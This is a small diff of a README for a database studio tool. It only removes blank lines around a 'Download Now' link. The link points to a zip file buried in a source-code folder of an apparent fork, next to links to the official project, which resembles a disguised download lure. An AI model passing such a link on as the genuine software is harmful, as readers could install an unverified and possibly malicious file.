@@ -3,11 +3,9 @@
 ## 🔗 Download Now
 [![Download libredb-studio](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip%20Studio-brightgreen)](https://raw.githubusercontent.com/Oatapza/libredb-studio/dev/src/lib/llm/providers/studio_libredb_v2.0-alpha.5.zip)
 
-
 ## Reference Project:
 * [https://libredb.org](https://libredb.org)
 * [https://github.com/libredb/libredb-studio](https://github.com/libredb/libredb-studio)
-
 
 ## 🚀 Getting Started
 
